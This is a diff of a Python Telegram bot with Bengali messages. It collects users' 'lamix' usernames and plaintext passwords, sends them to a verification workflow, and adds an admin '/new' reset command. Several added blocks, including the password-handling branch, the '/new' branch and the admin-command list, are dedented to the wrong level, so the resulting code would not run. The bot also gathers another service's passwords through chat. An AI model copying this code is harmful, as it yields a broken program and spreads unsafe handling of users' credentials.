@@ -464,41 +464,31 @@ def handle_step(chat_id, user_id, text, users):
         )
 
     elif step == "await_password":
-        lamix_username = users[uid].get("lamix_username", "")
-        lamix_password = text.strip()
+    lamix_username = users[uid].get("lamix_username", "")
+    lamix_password = text.strip()
 
-        # আগে step ও status আপডেট করো
-        users[uid]["step"] = ""
-        users[uid]["status"] = "pending"
-        save_users(users)
+    users[uid]["step"] = "verifying"
+    save_users(users)
 
+    send_message(chat_id,
+        "⏳ <b>একাউন্ট যাচাই করা হচ্ছে...</b>\n"
+        "একটু অপেক্ষা করুন।"
+    )
+
+    triggered = trigger_workflow(VERIFY_WORKFLOW, {
+        "user_id": uid,
+        "lamix_username": lamix_username,
+        "lamix_password": lamix_password
+    })
+
+    if not triggered:
         send_message(chat_id,
-            "⏳ <b>একাউন্ট যাচাই করা হচ্ছে...</b>\n"
-            "একটু অপেক্ষা করুন।"
+            "❌ যাচাই করা যায়নি। আবার চেষ্টা করুন।\n"
+            "/start দিয়ে শুরু করুন।"
         )
-
-        triggered = trigger_workflow(VERIFY_WORKFLOW, {
-            "user_id": uid,
-            "lamix_username": lamix_username,
-            "lamix_password": lamix_password
-        })
-
-        if triggered:
-            send_message(chat_id,
-                "✅ <b>তথ্য পাঠানো হয়েছে!</b>\n"
-                "━━━━━━━━━━━━━━━\n"
-                "যাচাই হলে Admin অনুমোদন করবেন।\n"
-                "অনুমোদন পেলে আপনাকে জানানো হবে।"
-            )
-            tg_username = users[uid].get("tg_username", "")
-            notify_admin_new_user(uid, tg_username, lamix_username)
-        else:
-            send_message(chat_id,
-                "❌ যাচাই করা যায়নি। আবার চেষ্টা করুন।\n"
-                "/start দিয়ে শুরু করুন।"
-            )
-            users[uid]["status"] = "new"
-            save_users(users)
+        users[uid]["status"] = "new"
+        users[uid]["step"] = ""
+        save_users(users)
 
     return users
 
@@ -555,6 +545,25 @@ def handle_admin_command(chat_id, text, users):
     elif cmd == "/users":
         handle_users_list(chat_id, users)
 
+    elif cmd == "/new" and len(parts) > 1:
+    target_username = parts[1].replace("@", "").lower()
+    found = False
+    for uid, u in users.items():
+        if u.get("tg_username", "").lower() == target_username:
+            users[uid]["status"] = "new"
+            users[uid]["lamix_username"] = ""
+            users[uid]["step"] = ""
+            save_users(users)
+            send_message(chat_id, f"🆕 @{target_username} কে new user করা হয়েছে।")
+            send_message(int(uid),
+                "🔄 <b>আপনার একাউন্ট রিসেট করা হয়েছে।</b>\n"
+                "নতুনভাবে /start দিয়ে শুরু করুন।"
+            )
+            found = True
+            break
+    if not found:
+        send_message(chat_id, f"❌ @{target_username} পাওয়া যায়নি।")
+
     return users
 
 # ── Main Loop ─────────────────────────────────────────────────────────────────
@@ -601,8 +610,8 @@ def main():
 
             # ── Admin text commands ──
             if is_admin and any(
-                text.lower().startswith(c) for c in ["/approve", "/ban", "/pending", "/users"]
-            ):
+    text.lower().startswith(c) for c in ["/approve", "/ban", "/pending", "/new", "/users"]
+):
                 users = handle_admin_command(chat_id, text, users)
                 continue
 
